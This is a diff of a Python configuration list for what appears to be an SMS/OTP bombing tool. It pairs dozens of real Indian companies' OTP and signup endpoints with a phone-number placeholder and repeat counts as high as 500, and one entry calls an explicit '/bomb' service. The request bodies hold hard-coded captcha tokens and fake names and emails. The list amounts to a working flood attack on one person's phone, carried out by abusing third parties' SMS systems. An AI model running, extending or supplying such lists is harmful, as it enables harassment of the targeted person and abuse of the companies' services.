@@ -350,7 +350,7 @@ SPEED_PRESETS = {
 
 # =============== ALL APIs START ===============
 APIS = [
-    # ============ ORIGINAL API FROM main.py ============
+    # ============ ORIGINAL API ============
     {
         "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
         "method": "GET",
@@ -358,7 +358,7 @@ APIS = [
         "data": None,
         "count": 100
     },
-    # ============ ORIGINAL APIS FROM main.py ============
+    # ============ NEW APIS ============
     {
         "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
         "method": "POST",
@@ -366,6 +366,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
         "count": 10
     },
+    
     {
         "url": "https://api.breeze.in/session/start",
         "method": "POST",
@@ -386,6 +387,7 @@ APIS = [
         }),
         "count": 10
     },
+    
     {
         "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
         "method": "GET",
@@ -399,6 +401,8 @@ APIS = [
         "data": None,
         "count": 10
     },
+    
+    # ============ COUNT=5 (3).txt APIs ============
     {
         "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
         "method": "POST",
@@ -421,6 +425,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
         "count": 5
     },
+    
     {
         "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
         "method": "POST",
@@ -442,6 +447,7 @@ APIS = [
         "data": None,
         "count": 500
     },
+    
     {
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
         "method": "POST",
@@ -456,6 +462,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
         "count": 20
     },
+    
     {
         "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
         "method": "POST",
@@ -479,6 +486,7 @@ APIS = [
         "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
         "count": 1
     },
+    
     {
         "url": "https://www.muthootfinance.com/smsapi.php",
         "method": "POST",
@@ -502,6 +510,7 @@ APIS = [
         "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
         "count": 3
     },
+    
     {
         "url": "https://api.gopaysense.com/users/otp",
         "method": "POST",
@@ -524,6 +533,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 5
     },
+    
     {
         "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
         "method": "POST",
@@ -547,6 +557,7 @@ APIS = [
         "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form",
         "count": 5
     },
+    
     {
         "url": "https://v2-api.bankopen.co/users/register/otp",
         "method": "POST",
@@ -572,6 +583,7 @@ APIS = [
         "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
         "count": 5
     },
+    
     {
         "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
         "method": "POST",
@@ -601,6 +613,7 @@ APIS = [
         }),
         "count": 40
     },
+    
     {
         "url": "https://apis.tradeindia.com/app_login_api/login_app",
         "method": "POST",
@@ -614,6 +627,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
         "count": 3
     },
+    
     {
         "url": "https://api.khatabook.com/v1/auth/request-otp",
         "method": "POST",
@@ -629,6 +643,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
         "count": 20
     },
+    
     {
         "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
         "method": "POST",
@@ -650,6 +665,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
         "count": 3
     },
+    
     {
         "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
         "method": "POST",
@@ -675,6 +691,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 5
     },
+    
     {
         "url": "https://mconnect.isteer.co/mconnect/login",
         "method": "POST",
@@ -697,6 +714,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
         "count": 50
     },
+    
     {
         "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
         "method": "GET",
@@ -716,6 +734,7 @@ APIS = [
         "data": None,
         "count": 3
     },
+    
     {
         "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
         "method": "POST",
@@ -739,6 +758,7 @@ APIS = [
         "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
         "count": 3
     },
+    
     {
         "url": "https://www.dream11.com/auth/passwordless/init",
         "method": "POST",
@@ -763,6 +783,7 @@ APIS = [
         "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
         "count": 1
     },
+    
     {
         "url": "https://citymall.live/api/cl-user/auth/get-otp",
         "method": "POST",
@@ -789,6 +810,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone_number": phone}),
         "count": 5
     },
+    
     {
         "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
         "method": "GET",
@@ -810,6 +832,7 @@ APIS = [
         "data": None,
         "count": 10
     },
+    
     {
         "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
         "method": "POST",
@@ -837,6 +860,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
         "count": 2
     },
+    
     {
         "url": "https://portal.myma.in/custom-api/auth/generateotp",
         "method": "POST",
@@ -858,6 +882,7 @@ APIS = [
         "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
         "count": 6
     },
+    
     {
         "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
         "method": "POST",
@@ -883,6 +908,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 6
     },
+    
     {
         "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
         "method": "POST",
@@ -910,6 +936,7 @@ APIS = [
         "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
         "count": 6
     },
+    
     {
         "url": "https://www.licious.in/api/login/signup",
         "method": "POST",
@@ -934,6 +961,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
         "count": 3
     },
+    
     {
         "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
         "method": "POST",
@@ -956,6 +984,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
         "count": 1
     },
+    
     {
         "url": "https://apis.bisleri.com/send-otp",
         "method": "POST",
@@ -978,6 +1007,7 @@ APIS = [
         "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
         "count": 20
     },
+    
     {
         "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
         "method": "POST",
@@ -993,6 +1023,7 @@ APIS = [
         "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"}),
         "count": 3
     },
+    
     {
         "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
         "method": "POST",
@@ -1017,6 +1048,7 @@ APIS = [
         "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
         "count": 5
     },
+    
     {
         "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
         "method": "GET",
@@ -1037,6 +1069,7 @@ APIS = [
         "data": None,
         "count": 5
     },
+    
     {
         "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
         "method": "POST",
@@ -1058,6 +1091,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 3
     },
+    
     {
         "url": "https://www.brevistay.com/cst/app-api/login",
         "method": "POST",
@@ -1083,6 +1117,7 @@ APIS = [
         "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
         "count": 15
     },
+    
     {
         "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
         "method": "POST",
@@ -1107,6 +1142,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 1
     },
+    
     {
         "url": "https://api.madrasmandi.in/api/v1/auth/otp",
         "method": "POST",
@@ -1131,6 +1167,7 @@ APIS = [
         "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
         "count": 3
     },
+    
     {
         "url": "https://www.bharatloan.com/login-sbm",
         "method": "POST",
@@ -1154,6 +1191,7 @@ APIS = [
         "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
         "count": 50
     },
+    
     {
         "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
         "method": "POST",
@@ -1179,6 +1217,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
         "count": 5
     },
+    
     {
         "url": "https://api.vahak.in/v1/u/o_w",
         "method": "POST",
@@ -1200,6 +1239,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
         "count": 1
     },
+    
     {
         "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
         "method": "POST",
@@ -1221,6 +1261,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
         "count": 1
     },
+    
     {
         "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
         "method": "POST",
@@ -1250,6 +1291,7 @@ APIS = [
         "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
         "count": 1
     },
+    
     {
         "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
         "method": "POST",
@@ -1271,6 +1313,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}),
         "count": 1
     },
+    
     {
         "url": "https://zerodha.com/account/registration.php",
         "method": "POST",
@@ -1299,6 +1342,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
         "count": 100
     },
+    
     {
         "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
         "method": "POST",
@@ -1322,6 +1366,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}}),
         "count": 100
     },
+    
     {
         "url": "https://api.testbook.com/api/v2/mobile/signup?mobile=9856985698&clientId=1117490662.1715447223&sessionId=1715447223",
         "method": "POST",
@@ -1344,6 +1389,7 @@ APIS = [
         "data": lambda phone: json.dumps({"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "signupSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "mobile": phone, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}}),
         "count": 1
     },
+    
     {
         "url": "https://loginprod.medibuddy.in/unified-login/user/register",
         "method": "POST",
@@ -1365,6 +1411,7 @@ APIS = [
         "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a", "mbUserId": None}),
         "count": 50
     },
+    
     {
         "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
         "method": "POST",
@@ -1388,6 +1435,7 @@ APIS = [
         "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA46Lsb5HaQXtezpeMPCnDMfDzkpcK-Q4zgi3w8ugXsZ9WStLQWSVWgh25WKbrOY2eCyC--nleXQBQ-9s8HDrqzBM6BIMDfkNpguN6krwHF3mdRTxTBEtt5NAUV8XF6VHAe2CeU4G7Qb10qUjUtEsQt4lTCa-bka2SK0VipNsIe4zP2kygDwqB5o1SyZms7t48Ku04fQmJSEJpYpi68ZXTJi7FjVyh01JLnu7ms1juztvZ7uMwMXHt4miFYAQlX9eglyPA-PKQbV8L-ILU8Z3sthWDNs6GJhDH-rnRK-ryOOAZDN2dDJd_ab4-RNj_5e8KJOruIg9uPHckSmRtm6xUVkDNjNn1fsGiQRGrAzpBmEOwRi5IEB-qFoVEEl4hFqBOLuRF386OBlfJrMJi4Cs766kprWznF8Sms9mHhU6JZA_m4H-I8zcCh3Bs4LYIZPH2iLRBqxUbGFLK-OL3_mcCLHIf3KXBD1sOFR7yithP3zw9RKDTxNjabd95yDuPLMjZpjggHKnEJY2xKekApjxMd9PlCBgm7TtcAelz5bRzugVA_-uo8ZxFzlGGnIUfqBwiCF-3Kim010z5jQCXRh39nnqXZumIomcLmcJqr-Rb71saIzr7dk4D4jXiAaxCadFSTXTDBFBpCbg3n3m331s54Sr96Qd3dPUmYMF1cgYXjimuRlUeHTEmOQXLtfO1_quzZXTKfodooPv5Hf1guiTYX9U75Fan3nvqNYLJWNKHoxZhvQsd88F9PprWh5qMg3MXs9Qz1PAtTWQHjOZnmzUvSUNYWxUg4uaYhucG1it62ncpYZpmDonvpLQyFwLfdKMJvPjyHudVfUgwR5ZIClGZVklhkCVqecbsH8K1WuQ-T5FVeNC1G2aca-pJkqG-U_2FOslhHT6W6bsX0MKr-zKZ77m-34zEQYlLpvNC2AfVng1YQbwT9unslwfuqnf_wGLKQbU9EIWTlJ__7WfanTI-XhDRbavzVcFhFfNvPweIFzgJlfaSSsWdvhZbEJ_tKVYplQ5_HHpcCvxD15cdnYKdmyr1z9LDMOMLjmuTzqneqWLU3POHwNZ6oJ_-P9qmJsCay-GqsbF8Wt3TxmgQ_2DRvj0JwVp3Yg3GB8AtPquN331LS4CzwvWNMiiPEXKpIlS9TeWSRgEdJtS9DMFyEn6pmkO22DoEkbp59BB2PtxGxtkbVG7rBOUhWtTqqBvRy6v6WCOjn2OQEREGoJKBU702UwYDmurrNimGeQCRhmTiKX-Qy3HINJmkN6FxEZulijqyBsS7CRifx8OmURflTnzpVsnJForYAe5uLm_KsJBxvC5TgMGsmlxd5Lkf1TKcCmCCC2ldo1A8RIBZ6LAvPqgLJtTPmPmX-p6NcbGOwYHESBI_ZLVN0OhiJxbVRowq72EZH7QIJX2yKUFZts6UHk_l-VccQAGvXJrCSEIpUMpIvnBCY5UU4RnfB-pqM1UvhbIneE3JbXE03zb84yasVWrt9b0NbnaQbSHGC7OBxF9yA8zBaGC1bn4riqLBHMYWewzQ3-dHcnoB8YkaXLAs3vydK7O-HO46ciPHH78CzgJykwHrgh6At5X8cT1Rlr9yIZR-GujFw3TOhOHPK9M5HmEvmUaESbRzoGbTuwhQRSA8BMqRiwKT_6aEBSbcBpBVnloSPyNHcLCqY1W1WditMKahnMZOvf0Y_G90IzfqxWkCHfQTvGBaRaAMgZTejWRHoQfqXvwXMYs32EXklZVGmAl2lzFBMiLQ", "expected_action": "login"}),
         "count": 3
     },
+    
     {
         "url": "https://api.tradeindia.com/home/registration/",
         "method": "POST",
@@ -1410,6 +1458,7 @@ APIS = [
         "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="co_name"\r\n\r\njoguo9igu89gu\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110086\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="source"\r\n\r\n{{}}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
         "count": 1
     },
+    
     {
         "url": "https://www.beyoung.in/api/sendOtp.json",
         "method": "POST",
@@ -1437,6 +1486,7 @@ APIS = [
         "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}),
         "count": 100
     },
+    
     {
         "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
         "method": "POST",
@@ -1460,6 +1510,7 @@ APIS = [
         "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
         "count": 5
     },
+    
     {
         "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
         "method": "POST",
@@ -1485,6 +1536,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile_no": phone}),
         "count": 1
     },
+    
     {
         "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
         "method": "POST",
@@ -1507,6 +1559,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
         "count": 10
     },
+    
     {
         "url": "https://www.coverfox.com/otp/send/",
         "method": "POST",
@@ -1530,6 +1583,7 @@ APIS = [
         "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
         "count": 5
     },
+    
     {
         "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
         "method": "POST",
@@ -1554,6 +1608,7 @@ APIS = [
         "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&redirect2=&login=2&userput_otp=",
         "count": 5
     },
+    
     {
         "url": "https://gomechanic.app/api/v2/send_otp",
         "method": "POST",
@@ -1576,6 +1631,7 @@ APIS = [
         "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
         "count": 50
     },
+    
     {
         "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
         "method": "POST",
@@ -1598,6 +1654,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
         "count": 50
     },
+    
     {
         "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
         "method": "POST",
@@ -1621,6 +1678,7 @@ APIS = [
         "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
         "count": 1
     },
+    
     {
         "url": "https://www.licious.in/api/login/signup",
         "method": "POST",
@@ -1645,6 +1703,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
         "count": 3
     },
+    
     {
         "url": "https://api.gopaysense.com/users/otp",
         "method": "POST",
@@ -1667,6 +1726,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phone": phone}),
         "count": 10
     },
+    
     {
         "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
         "method": "POST",
@@ -1689,6 +1749,7 @@ APIS = [
         "data": lambda phone: json.dumps({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}),
         "count": 7
     },
+    
     {
         "url": "https://oxygendigitalshop.com/graphql",
         "method": "POST",
@@ -1711,6 +1772,7 @@ APIS = [
         "data": lambda phone: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{phone}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}),
         "count": 7
     },
+    
     {
         "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
         "method": "POST",
@@ -1740,6 +1802,7 @@ APIS = [
         "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}),
         "count": 10
     },
+    
     {
         "url": "http://www.pinknblu.com/v1/auth/generate/otp",
         "method": "POST",
